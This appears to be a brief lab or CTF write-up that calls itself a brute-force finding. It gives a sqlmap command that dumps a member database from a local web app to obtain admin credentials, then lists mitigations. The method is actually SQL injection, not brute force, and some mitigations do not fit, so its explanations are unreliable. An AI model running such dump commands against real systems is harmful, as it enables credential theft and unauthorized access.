# Brute Force

It's possible for an attacker to brute force the sign in form

## Steps
* Open your terminal
* Run
```bash
sqlmap "http://192.68.0.106/index.php?page=member&id=1&Submit=Submit#" --dump -D Member_Brute_Force
```
You'll receive 2 admin account credentials

* Log in using the credentials
<img src="https://i.imgur.com/OSQQBkT.png" />

## Vulnerablilities
* An attacker can obtain sensitive data such as user passwords or pins in such cases.

## Ways to secure
* Ensure clients use strong complex passwords.
* Limit the amount requests a client can create
* Setup an endless SSH Honeypot
